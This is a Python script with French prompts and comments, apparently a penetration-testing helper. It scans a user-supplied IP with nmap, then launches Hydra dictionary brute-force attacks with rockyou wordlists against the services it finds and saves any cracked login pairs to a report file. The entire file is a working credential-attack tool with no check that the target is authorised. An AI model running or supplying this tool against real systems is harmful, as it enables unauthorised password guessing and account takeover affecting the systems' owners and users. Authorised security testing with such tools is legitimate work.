#!/usr/bin/python3

import nmap
import subprocess
import os
import time

def scan_nmap(ip_address, service):
    """Scan les ports ouverts pour un service spécifique."""
    nm = nmap.PortScanner()
    nm.scan(hosts=ip_address, arguments=f'-p {service} -sV -Pn')
    open_ports = []

    for host in nm.all_hosts():
        for proto in nm[host].all_protocols():
            ports = nm[host][proto].keys()
            for port in ports:
                if nm[host][proto][port]['state'] == 'open':
                    open_ports.append({
                        "service": nm[host][proto][port]['name'],
                        "port": port,
                        "version": nm[host][proto][port]['version']
                    })
    return open_ports

def run_hydra(ip_address, port, service, utilisateur, chemin_utilisateurs, chemin_mots_de_passe, nombre_sessions="5"):
    """Exécute Hydra pour effectuer une attaque de BruteForce."""
    start_time = time.time()

    if utilisateur:
        command = ["hydra", "-t", nombre_sessions, "-l", utilisateur, "-P", chemin_mots_de_passe, ip_address, service, "-s", str(port), "-vV"]
    else:
        command = ["hydra", "-t", nombre_sessions, "-L", chemin_utilisateurs, "-P", chemin_mots_de_passe, ip_address, service, "-s", str(port), "-vV"]

    process = subprocess.Popen(command, stdout=subprocess.PIPE, universal_newlines=True)
    credentials_found = []

    for line in process.stdout:
        print(line.strip())  # Affiche la sortie verbeuse en temps réel dans le shell
        if "login:" in line and "password:" in line:
            credentials_found.append(line.strip())

    process.wait()
    end_time = time.time()
    elapsed_time = end_time - start_time

    return credentials_found, elapsed_time

def save_results(credentials, filename, ip_address, service, elapsed_time, chemin_rapports):
    """Sauvegarde les résultats du BruteForce."""
    filepath = os.path.join(chemin_rapports, filename)
    with open(filepath, "a") as f:
        f.write("\n\n****************************************************************\n")
        f.write(f"BruteForce - {ip_address} - {service}\n")
        f.write("****************************************************************\n")
        f.write(f"Temps écoulé : {elapsed_time:.2f} secondes\n")
        for cred in credentials:
            f.write(cred + "\n")

def main(chemin_rapports):
    """Fonction principale pour l'attaque de BruteForce."""
    print("""
 ______   ______ _     _ _______ _______ _______  _____   ______ _______ _______                                                                    
 |_____] |_____/ |     |    |    |______ |______ |     | |_____/ |       |______                                                                    
 |_____] |    \_ |_____|    |    |______ |       |_____| |    \_ |_____  |______   
 """)
    while True:
        ip_address = input("Entrez une adresse IP à scanner : ")
        service = input("Entrez le numéro de port ou le service à rechercher : ")
        open_ports = scan_nmap(ip_address, service)

        if open_ports:
            for port_info in open_ports:
                print(f"Service {port_info['service']} sur le port {port_info['port']} trouvé.")
                if input(f"Lancer Hydra pour ce service ? (o/n) : ").lower() == 'o':
                    utilisateur = input("Entrez un nom d'utilisateur spécifique (laissez vide pour utiliser un dictionnaire) : ")
                    if utilisateur:
                        chemin_utilisateurs = None
                    else:
                        chemin_utilisateurs = input("Chemin des utilisateurs (laissez vide pour le dictionnaire par défaut) : ") or "/usr/share/wordlists/rockyou2.txt"
                    
                    chemin_mots_de_passe = input("Chemin des mots de passe (laissez vide pour le dictionnaire par défaut) : ") or "/usr/share/wordlists/rockyou2.txt"
                    nombre_sessions = input("Nombre de sessions simultanées (défaut 5) : ") or "5"
                    filename = input("Entrez le nom du fichier pour sauvegarder les résultats : ")

                    credentials, elapsed_time = run_hydra(ip_address, port_info['port'], port_info['service'], utilisateur, chemin_utilisateurs, chemin_mots_de_passe, nombre_sessions)
                    if credentials:
                        print("BruteForce réussi, voici les identifiants trouvés :")
                        for cred in credentials:
                            print(cred)
                        save_results(credentials, filename, ip_address, port_info['service'], elapsed_time, chemin_rapports)
                    else:
                        print("Pas de couple d'identifiants trouvés.")
        else:
            print("Aucun port ouvert trouvé correspondant au service spécifié.")

        if input("Voulez-vous refaire un scan sur une autre adresse IP ? (o/n) : ").lower() != 'o':
            break

if __name__ == "__main__":
    chemin_rapports = os.path.join(os.path.dirname(__file__), 'rapports')
    main(chemin_rapports)
